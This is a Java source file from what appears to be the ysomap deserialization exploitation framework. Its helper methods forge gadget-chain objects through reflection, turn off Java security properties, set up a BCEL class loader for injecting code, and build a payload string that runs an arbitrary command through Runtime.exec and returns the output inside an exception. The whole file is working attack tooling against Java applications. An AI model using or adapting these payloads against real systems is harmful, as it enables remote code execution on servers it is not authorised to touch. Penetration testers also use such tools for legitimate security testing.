package ysomap.core.util;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.shiro.subject.SimplePrincipalCollection;

import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.*;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

/**
 * @author wh1t3P1g
 * @since 2020/2/11
 */
@SuppressWarnings({"rawtypes","unchecked"})
public class PayloadHelper {
    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";


    public static <T> T createMemoitizedProxy (final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler (final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) ReflectionHelper.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(PayloadHelper.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<>();
        map.put(key, val);
        return map;
    }

    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception{
        HashMap s = new HashMap();
        ReflectionHelper.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        ReflectionHelper.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        ReflectionHelper.setFieldValue(s, "table", tbl);
        return s;
    }

    public static TreeSet makeTreeSet(Object v1, Object v2) throws Exception {
        TreeMap<Object,Object> m = new TreeMap<>();
        ReflectionHelper.setFieldValue(m, "size", 2);
        ReflectionHelper.setFieldValue(m, "modCount", 2);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        ReflectionHelper.setAccessible(nodeCons);
        Object node = nodeCons.newInstance(v1, new Object[0], null);
        Object right = nodeCons.newInstance(v2, new Object[0], node);
        ReflectionHelper.setFieldValue(node, "right", right);
        ReflectionHelper.setFieldValue(m, "root", node);

        TreeSet set = new TreeSet();
        ReflectionHelper.setFieldValue(set, "m", m);
        return set;
    }

    public static Object makeTreeSetWithXString(Object obj) throws Exception {
        Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
        ReflectionHelper.setFieldValue(rdnEntry1, "value", new XString("test"));

        Object rdnEntry2 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        ReflectionHelper.setFieldValue(rdnEntry2, "type", "ysomap");
        ReflectionHelper.setFieldValue(rdnEntry2, "value", obj);

        return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);
    }

    public static String defaultTestCommand(){
        return "open /System/Applications/Calculator.app";
    }

//    public static ObjectGadget makeGadget(Class<? extends ObjectGadget> clazz, String type) throws GenerateErrorException {
//        try {
//            return clazz.newInstance();
//        } catch (Exception e) {
//            throw new GenerateErrorException(type, clazz.getSimpleName());
//        }
//    }

    public static String makeBCELStr(byte[] classbytes) throws IOException {
        return "$$BCEL$$" + Utility.encode(classbytes, true);
    }

    public static Object makeBCELClassLoader() throws Exception {
        Class<?> clazz = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
        Object classLoader = clazz.newInstance();
        ReflectionHelper.setFieldValue(classLoader, "ignored_packages", new String[]{});
        Object defaultDomain = ReflectionHelper.getFieldValue(classLoader, "defaultDomain");
        ReflectionHelper.setFieldValue(defaultDomain, "codesource", null);
        ReflectionHelper.setFieldValue(defaultDomain, "classloader", null);
        ReflectionHelper.setFieldValue(classLoader, "defaultDomain", defaultDomain);
        ReflectionHelper.setFieldValue(classLoader, "assertionLock", null);
        ReflectionHelper.setFieldValue(classLoader, "parent", null);
        ReflectionHelper.setFieldValue(classLoader, "deferTo", null);

        Hashtable classes = (Hashtable) ReflectionHelper.getFieldValue(classLoader, "classes");
        classes.put("java.lang.Object", Object.class);
        classes.put("java.lang.Runtime", Runtime.class);
        return classLoader;
    }

    public static Object makeSimplePrincipalCollection(){
        return new SimplePrincipalCollection();
    }

    public static String makeExceptionPayload(String cmd){
        return "StringBuilder localStringBuffer = new StringBuilder();\n" +
                "Process localProcess = Runtime.getRuntime().exec(\""+
                cmd.replaceAll("\\\\","\\\\\\\\")
                        .replaceAll("\"", "\\\"") +"\");\n" +
                "java.io.BufferedReader localBufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(localProcess.getInputStream()));\n" +
                "String str1;\n" +
                "try {\n" +
                "     while ((str1 = localBufferedReader.readLine()) != null) {\n" +
                "         localStringBuffer.append(str1).append(\"\\n\");\n" +
                "     }\n" +
                "}catch (Exception e){\n" +
                "}\n" +
                "throw new Exception(localStringBuffer.toString());";
    }
}
